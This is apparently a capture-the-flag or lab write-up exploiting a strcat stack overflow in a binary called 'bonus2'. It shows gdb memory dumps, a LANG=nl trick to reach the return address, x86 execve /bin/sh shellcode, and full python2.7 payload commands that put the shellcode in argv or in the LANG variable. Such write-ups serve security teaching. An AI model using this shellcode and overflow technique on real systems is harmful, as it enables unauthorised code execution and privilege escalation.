# Shell code but **** segfault

## context

Program only work with 2 argv[].

Let's run it with gdb:

```py
r ccccaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ffeebbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
```

First argv 40 byte wrote in the stack 0xffffd230.

Second argv 32 byte wrote in the stack 0xffffd258.

```py
0xffffd220:	0xf7fc4540	0xffffffff	0x08048034	0xf7fc66d0
0xffffd230:	0x63636363	0x61616161	0x61616161	0x61616161
0xffffd240:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd250:	0x61616161	0x61616161	0x65656666	0x62626262
0xffffd260:	0x62626262	0x62626262	0x62626262	0x62626262
0xffffd270:	0x62626262	0x62626262	0x00000000	0x00000001
```

In function greet user, strcat hello + all the string = 
 
 ```py
0xffffd180:	0xffffd1d4	0xffffd1e0	0xf7ffd000	0x0804823c
0xffffd190:	0x6c6c6548	0x0000206f	0xffffd374	0xf7c39750
0xffffd1a0:	0xf7c0f664	0xf7d8e6c0	0x00000002	0x003055e4
0xffffd1b0:	0xf7c184be	0xffffd230	0xffffd354	0xffffd27c
0xffffd1c0:	0xffffd298	0xf7fd8f84	0x0804873c	0xf7d8e6c0
0xffffd1d0:	0xffffd6af	0xf7ffda40	0xffffd298	0x08048630
0xffffd1e0:	0x63636363	0x61616161	0x61616161	0x61616161
0xffffd1f0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd200:	0x61616161	0x61616161	0x65656666	0x62626262
0xffffd210:	0x62626262	0x62626262	0x62626262	0x62626262
0xffffd220:	0x62626262	0x62626262	0x00000000	0xf7fc66d0
 ```

So it write a total of 72 byte: argv + hello.

It segfault at return address 0x08006262, not enought byte wrote. It feel like, hello isnt large enought to lets us overwrite the return pointer as you can see the last address.

```py
0xffffd180:	0xffffd190	0xffffd1e0	0xf7ffd000	0x0804823c
0xffffd190:	0x6c6c6548	0x6363206f	0x61616363	0x61616161
0xffffd1a0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd1b0:	0x61616161	0x61616161	0x61616161	0x66666161
0xffffd1c0:	0x62626565	0x62626262	0x62626262	0x62626262
0xffffd1d0:	0x62626262	0x62626262	0x62626262	0x08006262
```

Main() memcmp LANG global var with getenv() if it is equal to fi or nl, it print another language (hint : more byte print than 'hello', it gonna help us overwrite the return pointer).

```c
lang = getenv("LANG");
if (lang != (char *)0x0)
	j = memcmp(lang,"fi",2);
```

```bash
$> env | grep LANG
LANG=en_US.UTF-8

$> export LANG=fi 
$> env | grep LANG
LANG=fi
```
with both fi and nl, return address is completely overwrite
stopped 0x62626262. So no matter which one we use, but it is not the same offset

```c
// for LANG=fi
[+] Found at offset 18 (little-endian search) likely
```
```c
// for LANG=nl
[+] Found at offset 23 (little-endian search) likely
```

I did choose nl.

## Exploit

i did try 2 differents ways to succed the bonus, only the second worked. All exploit used shell code.

### First

Idea was to write a shell code in the first arg, then offset + return address of the shell code.

payload = $(padding + shell code) $(offset + address of the buffer)

- shell code : ```\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80``` (21 bytes)
- buffer address: 0xbffff7f8
- padding \x90 * sizeofthebuffer[40] - shell_code.len = 19
- Offset = 23 (or 18 if you use fi).

```py
$(python2.7 -c 'import sys; sys.stdout.write( b"\x90" * 19 + b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")') $(python2.7 -c 'import sys; sys.stdout.write(b"A" * 23 + b"\xf8\xf7\xff\xbf")')
```

This worked fine on gdb, spawing a shell instance but seg on the terminal...

### Second : the Good one

I tryed store the shell code into the LANG var. Yes it is a buffer !

```py
export LANG=$(python2.7 -c 'import sys; sys.stdout.write( b"nl" + b"\x90" * 30 + b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
```

I tried without padding (\x90) but it seg.

To locate the buffer in the stack is easy, set a breakpoint in gdb after the getenv() and print $eax. Add a bit off padding to jump into \x90.

```py
./bonus2 $(python2.7 -c 'import sys; sys.stdout.write( b"\x90" * 40)') $(python2.7 -c 'import sys; sys.stdout.write(b"A" * 23 + b"\xd0\xfe\xff\xbf")')
```